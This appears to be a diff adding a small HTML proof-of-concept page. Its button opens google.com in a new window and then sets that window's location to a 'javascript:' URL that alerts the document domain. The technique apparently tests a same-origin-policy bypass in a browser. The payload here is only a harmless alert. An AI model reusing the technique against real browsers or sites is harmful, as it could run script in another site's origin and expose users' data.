@@ -1,0 +1,7 @@
+<button onclick="fsBypass();">click Here</button>
+<script>
+function fsBypass() {
+  var x = window.open("https://google.com");
+  setTimeout(function(){x.location = "javascript:alert(document.domain)";}, 1000)
+}
+</script>
